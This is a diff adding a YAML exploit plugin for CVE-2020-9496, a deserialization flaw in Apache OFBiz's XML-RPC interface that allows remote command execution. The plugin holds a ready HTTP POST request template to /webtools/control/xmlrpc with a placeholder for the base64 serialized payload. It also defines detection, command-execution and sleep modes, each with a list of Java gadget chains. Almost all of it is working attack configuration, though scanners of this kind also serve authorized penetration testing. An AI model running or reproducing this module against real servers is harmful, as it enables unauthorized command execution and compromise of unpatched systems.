@@ -1,0 +1,81 @@
+info:
+    app: OFBiz
+    name: CVE_2020_9496
+    author: 小晨曦
+    plugin_version: 1.0.0
+    disclosure_date: "2022-08-03"
+    create_date: "2024-10-06 08:30:16"
+    update_date: "2024-10-06 08:30:16"
+    scope: <17.12.04
+    description: 17.12.04版本之前的XMLRPC接口存在一处反序列化漏洞，攻击者利用这个漏洞可以在目标服务器上执行任意命令。
+    payload: |-
+        POST /webtools/control/xmlrpc HTTP/1.1
+        Host: your-ip
+        Content-Type: application/xml
+        Content-Length: 4093
+
+        <?xml version="1.0"?>
+        <methodCall>
+          <methodName>ProjectDiscovery</methodName>
+          <params>
+            <param>
+              <value>
+                <struct>
+                  <member>
+                    <name>test</name>
+                    <value>
+                      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]</serializable>
+                    </value>
+                  </member>
+                </struct>
+              </value>
+            </param>
+          </params>
+        </methodCall>
+    reference: https://github.com/vulhub/vulhub/blob/master/ofbiz/CVE-2020-9496/README.zh-cn.md
+payloads:
+    - name: check1
+      alias: 检测漏洞
+      params:
+          - key: cmd
+            title: DNS地址
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - FindClassByDNS
+            required: true
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - CommonsBeanutilsNoCC1SpringEncodeEcho
+                - CommonsBeanutilsNoCC2SpringEncodeEcho
+                - CommonsBeanutilsNoCC1TomcatEncodeEcho
+                - CommonsBeanutilsNoCC2TomcatEncodeEcho
+                - CommonsCollectionsK1TomcatEncodeEcho
+                - CommonsCollectionsK2TomcatEncodeEcho
+            required: true
+    - name: sleep1
+      alias: sleep检测
+      params:
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - CommonsBeanutilsNoCC1Sleep
+                - CommonsBeanutilsNoCC2Sleep
+                - CommonsCollectionsK1Sleep
+                - CommonsCollectionsK2Sleep
+            required: true
